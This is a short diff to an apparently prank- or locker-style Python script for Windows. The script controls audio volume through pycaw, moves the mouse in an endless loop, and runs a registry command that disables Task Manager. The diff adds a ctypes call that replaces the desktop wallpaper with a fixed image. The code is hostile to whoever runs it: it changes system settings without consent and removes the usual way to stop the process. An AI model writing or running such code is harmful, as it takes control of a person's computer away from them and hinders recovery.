@@ -1,4 +1,5 @@
 import os
+import ctypes
 from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
@@ -12,6 +13,8 @@ volume = cast(interface, POINTER(IAudioEndpointVolume))
 mute = volume.GetMute()
 vl = volume.GetMasterVolumeLevel()
 vr = volume.GetVolumeRange()
+a=os.getcwd()
+ctypes.windll.user32.SystemParametersInfoW(20,0,'C:\\Windows\\lp.png',0)
 os.system('REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
 class shubiao:
     def move(self,a,b):
@@ -24,3 +27,4 @@ while True:
     
     
     
+
